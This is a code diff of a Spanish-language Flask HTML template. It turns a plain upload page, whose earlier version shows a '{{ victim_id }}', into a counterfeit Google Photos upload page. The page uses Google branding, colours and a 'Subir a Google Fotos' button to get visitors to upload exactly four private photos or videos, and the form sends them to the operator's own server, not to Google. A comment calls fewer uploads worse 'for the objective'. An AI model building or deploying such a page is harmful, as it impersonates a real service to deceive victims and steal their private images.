@@ -3,89 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Carga tu Archivo</title>
+    <title>Google Fotos - Carga</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Estilos personalizados para un mejor aspecto */
+        /* Configuración de color para simular Google Photos */
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #1a1a2e; /* Fondo oscuro */
-            color: #e4e4e7; /* Texto claro */
+            background-color: #f1f3f4; 
         }
-        .container {
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        .header {
+            background-color: #ffffff;
+            border-bottom: 1px solid #dadce0;
         }
-        .card {
-            background-color: #2a2a44; /* Tarjeta más oscura */
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
-            max-width: 400px;
-            width: 90%;
-            border-radius: 12px;
-            padding: 2.5rem;
-            border: 1px solid #4a4a6e;
+        .google-blue {
+            background-color: #1a73e8;
         }
-        .file-input {
-            border: 2px dashed #4a4a6e;
-            padding: 1.5rem;
-            border-radius: 8px;
-            text-align: center;
+        .google-blue:hover {
+            background-color: #1669c7;
+        }
+        /* Estilo para simular la zona de arrastrar y soltar */
+        .dropzone {
+            border: 2px dashed #dadce0;
+            background-color: #ffffff;
+        }
+        input[type="file"]::file-selector-button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
             cursor: pointer;
-            transition: all 0.2s;
-        }
-        .file-input:hover {
-            border-color: #6a6a8e;
-            background-color: #3a3a54;
-        }
-        .submit-button {
-            background-color: #007bff; /* Color primario azul */
-            transition: background-color 0.2s, transform 0.1s;
-        }
-        .submit-button:hover {
-            background-color: #0056b3;
-            transform: translateY(-1px);
         }
     </style>
 </head>
-<body>
-    <div class="container">
-        <div class="card">
-            <h1 class="text-3xl font-bold mb-6 text-center text-white">Carga de Archivo Importante</h1>
-            <p class="text-sm text-center mb-6 text-gray-400">
-                Por favor, sube el archivo que te solicitamos.
-                <!-- Muestra el ID de víctima para referencia interna/debugging -->
-                <span class="block mt-2 text-xs opacity-50">ID de Sesión: {{ victim_id }}</span>
-            </p>
-
-            <!-- 
-            *** CORRECCIÓN CLAVE AQUÍ: action="{{ url_for('upload_file') }}" ***
-            Aseguramos que el formulario POST envíe los datos a la función 
-            `upload_file` de Flask, que es la que maneja la carga del archivo.
-            -->
-            <form method="POST" action="{{ url_for('upload_file') }}" enctype="multipart/form-data" class="space-y-6">
-                
-                <div class="file-input">
-                    <label for="file" class="block cursor-pointer">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="mx-auto h-8 w-8 text-indigo-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12" />
-                        </svg>
-                        <p class="mt-2 text-sm font-medium">Arrastra y suelta o haz clic para subir</p>
-                        <p class="text-xs text-gray-500">Máximo 10MB</p>
-                    </label>
-                    <!-- 
-                    El campo 'file' debe coincidir con request.files['file'] en main.py 
-                    IMPORTANTE: El input 'file' debe ser invisible y la etiqueta se encarga de la interacción.
-                    -->
-                    <input id="file" name="file" type="file" required class="sr-only">
-                </div>
-
-                <button type="submit" class="submit-button w-full text-white font-semibold py-2 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-4 focus:ring-blue-500 focus:ring-opacity-50">
-                    Subir Archivo
-                </button>
-            </form>
+<body class="min-h-screen">
+    
+    <!-- Encabezado de la App (Simulación Google Photos) -->
+    <header class="header shadow-sm sticky top-0 z-10">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex items-center">
+            <svg class="w-6 h-6 mr-3 text-red-500" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a8 8 0 100 16 8 8 0 000-16zM6.5 9.5a.5.5 0 011 0v3a.5.5 0 01-1 0v-3zM10 9.5a.5.5 0 011 0v3a.5.5 0 01-1 0v-3zM13.5 9.5a.5.5 0 011 0v3a.5.5 0 01-1 0v-3z"></path></svg>
+            <h1 class="text-xl font-medium text-gray-700">Google Fotos</h1>
         </div>
-    </div>
+    </header>
+
+    <main class="max-w-4xl mx-auto p-4 sm:p-6 lg:p-8">
+        <div class="bg-white p-8 rounded-xl shadow-lg mt-10">
+            
+            <div class="text-center mb-8">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mx-auto h-12 w-12 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 014 4v2a4 4 0 01-4 4H7z" />
+                </svg>
+                <h2 class="text-2xl font-bold text-gray-800 mt-3">Sube tus fotos y videos</h2>
+                <p class="text-gray-500 mt-2">
+                    Selecciona los archivos que deseas respaldar en Google Fotos.
+                </p>
+                <p class="text-sm text-gray-400 mt-1 font-semibold">
+                    Límite estricto de 4 archivos por sesión.
+                </p>
+            </div>
+
+            <form action="{{ url_for('upload_file') }}" method="POST" enctype="multipart/form-data">
+                
+                <div class="dropzone p-10 rounded-lg text-center cursor-pointer hover:border-blue-400 transition mb-6">
+                    <input 
+                        type="file" 
+                        id="file_input" 
+                        name="files" 
+                        multiple 
+                        required 
+                        accept="image/*,video/*"
+                        class="block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100"
+                        onchange="updateFileCount(this.files)"
+                    >
+                    <p id="file_status" class="mt-4 text-gray-600">Ningún archivo seleccionado.</p>
+                </div>
+                
+                <div class="flex justify-end">
+                    <button type="submit" class="google-blue text-white font-semibold py-2 px-6 rounded-lg transition duration-200 shadow-md">
+                        Subir a Google Fotos
+                    </button>
+                </div>
+            </form>
+
+        </div>
+    </main>
+
+    <script>
+        function updateFileCount(files) {
+            const statusElement = document.getElementById('file_status');
+            const maxFiles = 4;
+            
+            // Si el usuario intenta seleccionar más de 4 archivos
+            if (files.length > maxFiles) {
+                // *** ACCIÓN CLAVE: Limpia la selección del input ***
+                document.getElementById('file_input').value = ""; 
+
+                statusElement.textContent = `¡ERROR! Solo se permite la selección de exactamente ${maxFiles} archivos. Por favor, selecciona solo 4.`;
+                statusElement.classList.remove('text-green-600', 'text-gray-600');
+                statusElement.classList.add('text-red-500');
+            } 
+            // Si selecciona exactamente 4 archivos
+            else if (files.length === maxFiles) {
+                statusElement.textContent = `¡Éxito! ${files.length} archivos seleccionados (Límite alcanzado).`;
+                statusElement.classList.remove('text-red-500', 'text-gray-600');
+                statusElement.classList.add('text-green-600');
+            } 
+            // Si selecciona menos de 4 archivos (no recomendado para el objetivo)
+            else if (files.length > 0) {
+                statusElement.textContent = `Seleccionados: ${files.length} archivos. Aún faltan ${maxFiles - files.length} para el límite.`;
+                statusElement.classList.remove('text-red-500', 'text-green-600');
+                statusElement.classList.add('text-gray-600');
+            } 
+            // Si no selecciona archivos
+            else {
+                statusElement.textContent = 'Ningún archivo seleccionado.';
+                statusElement.classList.remove('text-red-500', 'text-green-600');
+                statusElement.classList.add('text-gray-600');
+            }
+        }
+    </script>
 </body>
 </html>
+
